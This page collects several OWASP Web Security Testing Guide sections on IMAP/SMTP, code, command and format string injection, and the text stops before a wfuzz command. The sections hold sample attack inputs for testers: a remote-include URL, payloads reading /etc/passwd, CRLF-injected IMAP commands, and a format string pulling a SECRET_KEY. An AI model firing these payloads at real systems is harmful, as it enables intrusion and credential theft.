                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/src/read_body.php?mailbox=INBOX&amp;passed_id=test&amp;startMessage=1</code></p>
                
                <p>will generate the following error message:</p>
                
                <pre><code class="language-txt">ERROR : Bad or malformed request.
                Query: FETCH test:test BODY[HEADER]
                Server responded: Error in IMAP command received by server.
                </code></pre>
                
                <p>In this example, the error message returned the name of the executed command and the corresponding parameters.</p>
                
                <p>In other situations, the error message (<code class="language-plaintext highlighter-rouge">not controlled</code> by the application) contains the name of the executed command, but reading the suitable <a href="#references">RFC</a> allows the tester to understand what other possible commands can be executed.</p>
                
                <p>If the application does not return descriptive error messages, the tester needs to analyze the affected functionality to deduce all the possible commands (and parameters) associated with the above mentioned functionality. For example, if a vulnerable parameter has been detected in the create mailbox functionality, it is logical to assume that the affected IMAP command is <code class="language-plaintext highlighter-rouge">CREATE</code>. According to the RFC, the <code class="language-plaintext highlighter-rouge">CREATE</code> command accepts one parameter which specifies the name of the mailbox to create.</p>
                
                <blockquote>
                  <p>List of IMAP/SMTP commands affected</p>
                
                  <ul>
                    <li>Type, value, and number of parameters expected by the affected IMAP/SMTP commands</li>
                  </ul>
                </blockquote>
                
                <h3 id="imapsmtp-command-injection">IMAP/SMTP Command Injection</h3>
                
                <p>Once the tester has identified vulnerable parameters and has analyzed the context in which they are executed, the next stage is exploiting the functionality.</p>
                
                <p>This stage has two possible outcomes:</p>
                
                <ol>
                  <li>The injection is possible in an unauthenticated state: the affected functionality does not require the user to be authenticated. The injected (IMAP) commands available are limited to: <code class="language-plaintext highlighter-rouge">CAPABILITY</code>, <code class="language-plaintext highlighter-rouge">NOOP</code>, <code class="language-plaintext highlighter-rouge">AUTHENTICATE</code>, <code class="language-plaintext highlighter-rouge">LOGIN</code>, and <code class="language-plaintext highlighter-rouge">LOGOUT</code>.</li>
                  <li>The injection is only possible in an authenticated state: the successful exploitation requires the user to be fully authenticated before testing can continue.</li>
                </ol>
                
                <p>In any case, the typical structure of an IMAP/SMTP Injection is as follows:</p>
                
                <ul>
                  <li>Header: ending of the expected command;</li>
                  <li>Body: injection of the new command;</li>
                  <li>Footer: beginning of the expected command.</li>
                </ul>
                
                <p>It is important to remember that, in order to execute an IMAP/SMTP command, the previous command must be terminated with the CRLF (<code class="language-plaintext highlighter-rouge">%0d%0a</code>) sequence.</p>
                
                <p>Let’s suppose that in the <a href="#identifying-vulnerable-parameters">Identifying vulnerable parameters</a> stage, the attacker detects that the parameter <code class="language-plaintext highlighter-rouge">message_id</code> in the following request is vulnerable:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/read_email.php?message_id=4791</code></p>
                
                <p>Let’s suppose also that the outcome of the analysis performed in the stage 2 (“Understanding the data flow and deployment structure of the client”) has identified the command and arguments associated with this parameter as:</p>
                
                <p><code class="language-plaintext highlighter-rouge">FETCH 4791 BODY[HEADER]</code></p>
                
                <p>In this scenario, the IMAP injection structure would be:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://&lt;webmail&gt;/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791</code></p>
                
                <p>Which would generate the following commands:</p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">????</span> <span class="k">FETCH</span> <span class="mi">4791</span> <span class="n">BODY</span><span class="p">[</span><span class="n">HEADER</span><span class="p">]</span>
                <span class="n">V100</span> <span class="n">CAPABILITY</span>
                <span class="n">V101</span> <span class="k">FETCH</span> <span class="mi">4791</span> <span class="n">BODY</span><span class="p">[</span><span class="n">HEADER</span><span class="p">]</span>
                </code></pre></div></div>
                
                <p>where:</p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Header</span> <span class="o">=</span> <span class="mi">4791</span> <span class="n">BODY</span><span class="p">[</span><span class="n">HEADER</span><span class="p">]</span>
                <span class="n">Body</span>   <span class="o">=</span> <span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">aV100</span> <span class="n">CAPABILITY</span><span class="o">%</span><span class="mi">0</span><span class="n">d</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span>
                <span class="n">Footer</span> <span class="o">=</span> <span class="n">V101</span> <span class="k">FETCH</span> <span class="mi">4791</span>
                </code></pre></div></div>
                
                <blockquote>
                  <p>List of IMAP/SMTP commands affected</p>
                
                  <ul>
                    <li>Arbitrary IMAP/SMTP command injection</li>
                  </ul>
                </blockquote>
                
                <h2 id="references">References</h2>
                
                <h3 id="whitepapers">Whitepapers</h3>
                
                <ul>
                  <li><a href="https://tools.ietf.org/html/rfc821">RFC 0821 “Simple Mail Transfer Protocol”</a></li>
                  <li><a href="https://tools.ietf.org/html/rfc3501">RFC 3501 “Internet Message Access Protocol - Version 4rev1”</a></li>
                  <li><a href="http://www.webappsec.org/projects/articles/121106.pdf">Vicente Aguilera Díaz: “MX Injection: Capturing and Exploiting Hidden Mail Servers”</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv11Modal" tabindex="-1" role="dialog" aria-labelledby="inpv11ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv11ModalLabel">WSTG-INPV-11 - Testing for Code Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>This section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server.</p>
                
                <p>In <a href="https://owasp.org/www-community/attacks/Code_Injection">Code Injection</a> testing, a tester submits input that is processed by the web server as dynamic code or as an included file. These tests can target various server-side scripting engines, e.g., ASP or PHP. Proper input validation and secure coding practices need to be employed to protect against these attacks.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify injection points where you can inject code into the application.</li>
                  <li>Assess the injection severity.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="black-box-testing">Black-Box Testing</h3>
                
                <h4 id="testing-for-php-injection-vulnerabilities">Testing for PHP Injection Vulnerabilities</h4>
                
                <p>Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&amp;cmd=uname%20-a</code></p>
                
                <blockquote>
                  <p>The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.</p>
                </blockquote>
                
                <h3 id="gray-box-testing">Gray-Box Testing</h3>
                
                <h4 id="testing-for-asp-code-injection-vulnerabilities">Testing for ASP Code Injection Vulnerabilities</h4>
                
                <p>Examine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it:</p>
                
                <pre><code class="language-asp">&lt;%
                If&nbsp;not&nbsp;isEmpty(Request(&nbsp;"Data"&nbsp;)&nbsp;)&nbsp;Then
                Dim&nbsp;fso,&nbsp;f
                'User&nbsp;input&nbsp;Data&nbsp;is&nbsp;written&nbsp;to&nbsp;a&nbsp;file&nbsp;named&nbsp;data.txt
                Set&nbsp;fso&nbsp;=&nbsp;CreateObject("Scripting.FileSystemObject")
                Set&nbsp;f&nbsp;=&nbsp;fso.OpenTextFile(Server.MapPath(&nbsp;"data.txt"&nbsp;),&nbsp;8,&nbsp;True)
                f.Write&nbsp;Request("Data")&nbsp;&amp;&nbsp;vbCrLf
                f.close
                Set&nbsp;f&nbsp;=&nbsp;nothing
                Set&nbsp;fso&nbsp;=&nbsp;Nothing
                
                'Data.txt&nbsp;is&nbsp;executed
                Server.Execute(&nbsp;"data.txt"&nbsp;)
                
                Else
                %&gt;
                
                &lt;form&gt;
                &lt;input name="Data" /&gt;&lt;input type="submit" name="Enter Data" /&gt;
                
                &lt;/form&gt;
                &lt;%
                End&nbsp;If
                %&gt;)))
                </code></pre>
                
                <h3 id="references">References</h3>
                
                <ul>
                  <li><a href="http://www.securityfocus.com">Security Focus</a></li>
                  <li><a href="http://www.insecure.org">Insecure.org</a></li>
                  <li><a href="https://www.wikipedia.org">Wikipedia</a></li>
                  <li><a href="https://wiki.owasp.org/index.php/OS_Injection">Reviewing Code for OS Injection</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv12Modal" tabindex="-1" role="dialog" aria-labelledby="inpv12ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv12ModalLabel">WSTG-INPV-12 - Testing for Command Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>This article describes how to test an application for OS command injection. The tester will try to inject an OS command through an HTTP request to the application.</p>
                
                <p>OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify and assess the command injection points.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol <code class="language-plaintext highlighter-rouge">|</code> onto the end of the filename.</p>
                
                <p>Example URL before alteration:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://sensitive/cgi-bin/userData.pl?doc=user1.txt</code></p>
                
                <p>Example URL modified:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|</code></p>
                
                <p>This will execute the command <code class="language-plaintext highlighter-rouge">/bin/ls</code>.</p>
                
                <p>Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. <code class="language-plaintext highlighter-rouge">%3B</code> is URL encoded and decodes to semicolon</p>
                
                <p>Example:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://sensitive/something.php?dir=%3Bcat%20/etc/passwd</code></p>
                
                <h3 id="example">Example</h3>
                
                <p>Consider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (<code class="language-plaintext highlighter-rouge">http://www.example.com/public/doc</code>):</p>
                
                <pre><code class="language-txt">POST /public/doc HTTP/1.1
                Host: www.example.com
                [...]
                Referer: http://127.0.0.1/WebGoat/attack?Screen=20
                Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
                Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
                Content-Type: application/x-www-form-urlencoded
                Content-length: 33
                
                Doc=Doc1.pdf
                </code></pre>
                
                <p>In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following (<code class="language-plaintext highlighter-rouge">http://www.example.com/public/doc</code>):</p>
                
                <pre><code class="language-txt">POST /public/doc HTTP/1.1
                Host: www.example.com
                [...]
                Referer: http://127.0.0.1/WebGoat/attack?Screen=20
                Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
                Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
                Content-Type: application/x-www-form-urlencoded
                Content-length: 33
                
                Doc=Doc1.pdf+|+Dir c:\
                </code></pre>
                
                <p>If the application doesn’t validate the request, we can obtain the following result:</p>
                
                <pre><code class="language-txt">    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
                    Output...
                    Il volume nell'unità C non ha etichetta.
                    Numero di serie Del volume: 8E3F-4B61
                    Directory of c:\
                     18/10/2006 00:27 2,675 Dir_Prog.txt
                     18/10/2006 00:28 3,887 Dir_ProgFile.txt
                     16/11/2006 10:43
                        Doc
                        11/11/2006 17:25
                           Documents and Settings
                           25/10/2006 03:11
                              I386
                              14/11/2006 18:51
                             h4ck3r
                             30/09/2005 21:40 25,934
                            OWASP1.JPG
                            03/11/2006 18:29
                                Prog
                                18/11/2006 11:20
                                    Program Files
                                    16/11/2006 21:12
                                        Software
                                        24/10/2006 18:25
                                            Setup
                                            24/10/2006 23:37
                                                Technologies
                                                18/11/2006 11:14
                                                3 File 32,496 byte
                                                13 Directory 6,921,269,248 byte disponibili
                                                Return code: 0
                </code></pre>
                
                <p>In this case, we have successfully performed an OS injection attack.</p>
                
                <h2 id="special-characters-for-comand-injection">Special Characters for Comand Injection</h2>
                
                <p>The following special character can be used for command injection such as <code class="language-plaintext highlighter-rouge">|</code> <code class="language-plaintext highlighter-rouge">;</code> <code class="language-plaintext highlighter-rouge">&amp;</code> <code class="language-plaintext highlighter-rouge">$</code> <code class="language-plaintext highlighter-rouge">&gt;</code> <code class="language-plaintext highlighter-rouge">&lt;</code> <code class="language-plaintext highlighter-rouge">'</code> <code class="language-plaintext highlighter-rouge">!</code></p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">cmd1|cmd2</code> : Uses of <code class="language-plaintext highlighter-rouge">|</code> will make command 2 to be executed weather command 1 execution is successful or not.</li>
                  <li><code class="language-plaintext highlighter-rouge">cmd1;cmd2</code> : Uses of <code class="language-plaintext highlighter-rouge">;</code> will make command 2 to be executed weather command 1 execution is successful or not.</li>
                  <li><code class="language-plaintext highlighter-rouge">cmd1||cmd2</code> : Command 2 will only be executed if command 1 execution fails.</li>
                  <li><code class="language-plaintext highlighter-rouge">cmd1&amp;&amp;cmd2</code> : Command 2 will only be executed if command 1 execution succeeds.</li>
                  <li><code class="language-plaintext highlighter-rouge">$(cmd)</code> : For example, <code class="language-plaintext highlighter-rouge">echo $(whoami)</code> or <code class="language-plaintext highlighter-rouge">$(touch test.sh; echo 'ls' &gt; test.sh)</code></li>
                  <li><code class="language-plaintext highlighter-rouge">cmd</code> : It’s used to execute specific command. For example, <code class="language-plaintext highlighter-rouge">whoami</code></li>
                  <li><code class="language-plaintext highlighter-rouge">&gt;(cmd)</code>: <code class="language-plaintext highlighter-rouge">&gt;(ls)</code></li>
                  <li><code class="language-plaintext highlighter-rouge">&lt;(cmd)</code>: <code class="language-plaintext highlighter-rouge">&lt;(ls)</code></li>
                </ul>
                
                <h2 id="code-review-dangerous-api">Code Review Dangerous API</h2>
                
                <p>Be aware of the uses of following API as it may introduce the command injection risks.</p>
                
                <h3 id="java">Java</h3>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">Runtime.exec()</code></li>
                </ul>
                
                <h3 id="cc">C/C++</h3>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">system</code></li>
                  <li><code class="language-plaintext highlighter-rouge">exec</code></li>
                  <li><code class="language-plaintext highlighter-rouge">ShellExecute</code></li>
                </ul>
                
                <h3 id="python">Python</h3>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">exec</code></li>
                  <li><code class="language-plaintext highlighter-rouge">eval</code></li>
                  <li><code class="language-plaintext highlighter-rouge">os.system</code></li>
                  <li><code class="language-plaintext highlighter-rouge">os.popen</code></li>
                  <li><code class="language-plaintext highlighter-rouge">subprocess.popen</code></li>
                  <li><code class="language-plaintext highlighter-rouge">subprocess.call</code></li>
                </ul>
                
                <h3 id="php">PHP</h3>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">system</code></li>
                  <li><code class="language-plaintext highlighter-rouge">shell_exec</code></li>
                  <li><code class="language-plaintext highlighter-rouge">exec</code></li>
                  <li><code class="language-plaintext highlighter-rouge">proc_open</code></li>
                  <li><code class="language-plaintext highlighter-rouge">eval</code></li>
                </ul>
                
                <h2 id="remediation">Remediation</h2>
                
                <h3 id="sanitization">Sanitization</h3>
                
                <p>The URL and form data needs to be sanitized for invalid characters. A deny list of characters is an option but it may be difficult to think of all of the characters to validate against. Also there may be some that were not discovered as of yet. An allow list containing only allowable characters or command list should be created to validate the user input. Characters that were missed, as well as undiscovered threats, should be eliminated by this list.</p>
                
                <p>General deny list to be included for command injection can be <code class="language-plaintext highlighter-rouge">|</code> <code class="language-plaintext highlighter-rouge">;</code> <code class="language-plaintext highlighter-rouge">&amp;</code> <code class="language-plaintext highlighter-rouge">$</code> <code class="language-plaintext highlighter-rouge">&gt;</code> <code class="language-plaintext highlighter-rouge">&lt;</code> <code class="language-plaintext highlighter-rouge">'</code> <code class="language-plaintext highlighter-rouge">\</code> <code class="language-plaintext highlighter-rouge">!</code> <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> <code class="language-plaintext highlighter-rouge">#</code></p>
                
                <p>Escape or filter special characters for windows, &nbsp; <code class="language-plaintext highlighter-rouge">(</code> <code class="language-plaintext highlighter-rouge">)</code> <code class="language-plaintext highlighter-rouge">&lt;</code> <code class="language-plaintext highlighter-rouge">&gt;</code> <code class="language-plaintext highlighter-rouge">&amp;</code> <code class="language-plaintext highlighter-rouge">*</code> <code class="language-plaintext highlighter-rouge">‘</code> <code class="language-plaintext highlighter-rouge">|</code> <code class="language-plaintext highlighter-rouge">=</code> <code class="language-plaintext highlighter-rouge">?</code> <code class="language-plaintext highlighter-rouge">;</code> <code class="language-plaintext highlighter-rouge">[</code> <code class="language-plaintext highlighter-rouge">]</code> <code class="language-plaintext highlighter-rouge">^</code> <code class="language-plaintext highlighter-rouge">~</code> <code class="language-plaintext highlighter-rouge">!</code> <code class="language-plaintext highlighter-rouge">.</code> <code class="language-plaintext highlighter-rouge">"</code> <code class="language-plaintext highlighter-rouge">%</code> <code class="language-plaintext highlighter-rouge"></code> <code class="language-plaintext highlighter-rouge">/</code> <code class="language-plaintext highlighter-rouge">\</code> <code class="language-plaintext highlighter-rouge">:</code>&nbsp;<code class="language-plaintext highlighter-rouge">+</code> <code class="language-plaintext highlighter-rouge">,</code>  <code class="language-plaintext highlighter-rouge">`</code>
                Escape or filter special characters for Linux, <code class="language-plaintext highlighter-rouge">{</code> <code class="language-plaintext highlighter-rouge">}</code> <code class="language-plaintext highlighter-rouge">(</code> <code class="language-plaintext highlighter-rouge">)</code> <code class="language-plaintext highlighter-rouge">&gt;</code> <code class="language-plaintext highlighter-rouge">&lt;</code> <code class="language-plaintext highlighter-rouge">&amp;</code> <code class="language-plaintext highlighter-rouge">*</code> <code class="language-plaintext highlighter-rouge">‘</code> <code class="language-plaintext highlighter-rouge">|</code> <code class="language-plaintext highlighter-rouge">=</code> <code class="language-plaintext highlighter-rouge">?</code> <code class="language-plaintext highlighter-rouge">;</code> <code class="language-plaintext highlighter-rouge">[</code> <code class="language-plaintext highlighter-rouge">]</code>&nbsp;<code class="language-plaintext highlighter-rouge">$</code> <code class="language-plaintext highlighter-rouge">–</code> <code class="language-plaintext highlighter-rouge">#</code>&nbsp;<code class="language-plaintext highlighter-rouge">~</code> <code class="language-plaintext highlighter-rouge">!</code> <code class="language-plaintext highlighter-rouge">.</code> <code class="language-plaintext highlighter-rouge">"</code> <code class="language-plaintext highlighter-rouge">%</code>&nbsp; <code class="language-plaintext highlighter-rouge">/</code> <code class="language-plaintext highlighter-rouge">\</code> <code class="language-plaintext highlighter-rouge">:</code>&nbsp;<code class="language-plaintext highlighter-rouge">+</code> <code class="language-plaintext highlighter-rouge">,</code> <code class="language-plaintext highlighter-rouge">`</code></p>
                
                <h3 id="permissions">Permissions</h3>
                
                <p>The web application and its components should be running under strict permissions that do not allow operating system command execution. Try to verify all this information to test from a gray-box testing point of view.</p>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li>OWASP <a href="https://owasp.org/www-project-webgoat/">WebGoat</a></li>
                  <li><a href="https://github.com/commixproject/commix">Commix</a></li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://www.symantec.com/connect/articles/penetration-testing-web-applications-part-two">Penetration Testing for Web Applications (Part Two)</a></li>
                  <li><a href="http://projects.webappsec.org/w/page/13246950/OS%20Commanding">OS Commanding</a></li>
                  <li><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</a></li>
                  <li><a href="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177">ENV33-C. Do not call system()</a></li>
                </ul>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv13Modal" tabindex="-1" role="dialog" aria-labelledby="inpv13ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv13ModalLabel">WSTG-INPV-13 - Testing for Format String Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>A format string is a null-terminated character sequence that also contains conversion specifiers interpreted or converted at runtime. If server-side code <a href="https://www.netsparker.com/blog/web-security/string-concatenation-format-string-vulnerabilities/">concatenates a user’s input with a format string</a>, an attacker can append additional conversion specifiers to cause a runtime error, information disclosure, or buffer overflow.</p>
                
                <p>The worst case for format strings vulnerabilities occur in languages that don’t check arguments and also include a <code class="language-plaintext highlighter-rouge">%n</code> specifier that writes to memory. These functions, if exploited by an attacker modifying a format string, could cause <a href="https://www.veracode.com/security/format-string">information disclosure and code execution</a>:</p>
                
                <ul>
                  <li>C and C++ <a href="https://en.cppreference.com/w/c/io/fprintf">printf</a> and similar methods fprintf, sprintf, snprintf</li>
                  <li>Perl <a href="https://perldoc.perl.org/functions/printf.html">printf</a> and sprintf</li>
                </ul>
                
                <p>These format string functions cannot write to memory, but attackers can still cause information disclosure by changing format strings to output values the developers did not intend to send:</p>
                
                <ul>
                  <li>Python 2.6 and 2.7 <a href="https://docs.python.org/2/library/string.html">str.format</a> and Python 3 unicode <a href="https://docs.python.org/3/library/stdtypes.html#str.format">str.format</a> can be modified by injecting strings that can point to <a href="https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/">other variables</a> in memory</li>
                </ul>
                
                <p>The following format string functions can cause runtime errors if the attacker adds conversion specifiers:</p>
                
                <ul>
                  <li>Java <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/String.html#format%28java.util.Locale%2Cjava.lang.String%2Cjava.lang.Object...%29">String.format</a> and <a href="https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/PrintStream.html#format%2528java.util.Locale%252Cjava.lang.String%252Cjava.lang.Object...%2529">PrintStream.format</a></li>
                  <li>PHP <a href="https://www.php.net/manual/es/function.printf.php">printf</a></li>
                </ul>
                
                <p>The code pattern that causes a format string vulnerability is a call to a string format function that contains unsanitized user input. The following example shows how a debug <code class="language-plaintext highlighter-rouge">printf</code> could make a program vulnerable:</p>
                
                <p>The example in C:</p>
                
                <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="o">*</span><span class="n">userName</span> <span class="o">=</span> <span class="cm">/* input from user controlled field */</span><span class="p">;</span>
                
                <span class="n">printf</span><span class="p">(</span><span class="s">"DEBUG Current user: "</span><span class="p">);</span>
                <span class="c1">// Vulnerable debugging code</span>
                <span class="n">printf</span><span class="p">(</span><span class="n">userName</span><span class="p">);</span>
                </code></pre></div></div>
                
                <p>The example in Java:</p>
                
                <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">final</span> <span class="nc">String</span> <span class="n">userName</span> <span class="o">=</span> <span class="cm">/* input from user controlled field */</span><span class="o">;</span>
                
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="s">"DEBUG Current user: "</span><span class="o">);</span>
                <span class="c1">// Vulnerable code:</span>
                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="n">userName</span><span class="o">);</span>
                </code></pre></div></div>
                
                <p>In this particular example, if the attacker set their <code class="language-plaintext highlighter-rouge">userName</code> to have one or more conversion specifiers, there would be unwanted behaviour. The C example would <a href="https://www.defcon.org/images/defcon-18/dc-18-presentations/Haas/DEFCON-18-Haas-Adv-Format-String-Attacks.pdf">print out memory contents</a> if <code class="language-plaintext highlighter-rouge">userName</code> contained <code class="language-plaintext highlighter-rouge">%p%p%p%p%p</code>, and it can corrupt memory contents if there is a <code class="language-plaintext highlighter-rouge">%n</code> in the string. In the Java example, a <code class="language-plaintext highlighter-rouge">username</code> containing any specifier that needs an input (including <code class="language-plaintext highlighter-rouge">%x</code> or <code class="language-plaintext highlighter-rouge">%s</code>) would cause the program to crash with <code class="language-plaintext highlighter-rouge">IllegalFormatException</code>. Although the examples are still subject to other problems, the vulnerability can be fixed by printf arguments of <code class="language-plaintext highlighter-rouge">printf("DEBUG Current user: %s", userName)</code>.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behaviour from the application.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>Tests include analysis of the code and injecting conversion specifiers as user input to the application under test.</p>
                
                <h3 id="static-analysis">Static Analysis</h3>
                
                <p>Static analysis tools can find format string vulnerabilities in either the code or in binaries. Examples of tools include:</p>
                
                <ul>
                  <li>C and C++: <a href="https://dwheeler.com/flawfinder/">Flawfinder</a></li>
                  <li>Java: FindSecurityBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#FORMAT_STRING_MANIPULATION">FORMAT_STRING_MANIPULATION</a></li>
                  <li>PHP: String formatter Analyzer in <a href="https://github.com/ovr/phpsa/blob/master/docs/05_Analyzers.md#function_string_formater">phpsa</a></li>
                </ul>
                
                <h3 id="manual-code-inspection">Manual Code Inspection</h3>
                
                <p>Static analysis may miss more subtle cases including format strings generated by complex code. To look for vulnerabilities manually in a codebase, a tester can look for all calls in the codebase that accept a format string and trace back to make sure untrusted input cannot change the format string.</p>
                
                <h3 id="conversion-specifier-injection">Conversion Specifier Injection</h3>
                
                <p>Testers can check at the unit test or full system test level by sending conversion specifiers in any string input. <a href="https://owasp.org/www-community/Fuzzing">Fuzz</a> the program using all of the conversion specifiers for all languages the system under test uses. See the <a href="https://owasp.org/www-community/attacks/Format_string_attack">OWASP Format string attack</a> page for possible inputs to use. If the test fails, the program will crash or display an unexpected output. If the test passes, the attempt to send a conversion specifier should be blocked, or the string should go through the system with no issues as with any other valid input.</p>
                
                <p>The examples in the following subsections have a URL of this form:</p>
                
                <p><code class="language-plaintext highlighter-rouge">https://vulnerable_host/userinfo?username=x</code></p>
                
                <ul>
                  <li>The user-controlled value is <code class="language-plaintext highlighter-rouge">x</code> (for the <code class="language-plaintext highlighter-rouge">username</code> parameter).</li>
                </ul>
                
                <h4 id="manual-injection">Manual Injection</h4>
                
                <p>Testers can perform a manual test using a web browser or other web API debugging tools. Browse to the web application or site such that the query has conversion specifiers. Note that most conversion specifiers need <a href="https://tools.ietf.org/html/rfc3986#section-2.1">encoding</a> if sent inside a URL because they contain special characters including <code class="language-plaintext highlighter-rouge">%</code> and <code class="language-plaintext highlighter-rouge">{</code>. The test can introduce a string of specifiers <code class="language-plaintext highlighter-rouge">%s%s%s%n</code> by browsing with the following URL:</p>
                
                <p><code class="language-plaintext highlighter-rouge">https://vulnerable_host/userinfo?username=%25s%25s%25s%25n</code></p>
                
                <p>If the web site is vulnerable, the browser or tool should receive an error, which may include a timeout or an HTTP return code 500.</p>
                
                <p>The Java code returns the error</p>
                
                <p><code class="language-plaintext highlighter-rouge">java.util.MissingFormatArgumentException: Format specifier '%s'</code></p>
                
                <p>Depending on the C implementation, the process may crash completely with <code class="language-plaintext highlighter-rouge">Segmentation Fault</code>.</p>
                
                <h4 id="tool-assisted-fuzzing">Tool Assisted Fuzzing</h4>
                
                <p>Fuzzing tools including <a href="https://github.com/xmendez/wfuzz">wfuzz</a> can automate injection tests. For wfuzz, start with a text file (fuzz.txt in this example) with one input per line:</p>
                
                <p>fuzz.txt:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alice
                %s%s%s%n
                %p%p%p%p%p
                {event.__init__.__globals__[CONFIG][SECRET_KEY]}
                </code></pre></div></div>
                
                <p>The <code class="language-plaintext highlighter-rouge">fuzz.txt</code> file contains the following:</p>
                
                <ul>
                  <li>A valid input <code class="language-plaintext highlighter-rouge">alice</code> to verify the application can process a normal input</li>
                  <li>Two strings with C-like conversion specifiers</li>
                  <li>One Python conversion specifier to attempt to read global variables</li>
                </ul>
                
                <p>To send the fuzzing input file to the web application under test, use the following command:</p>
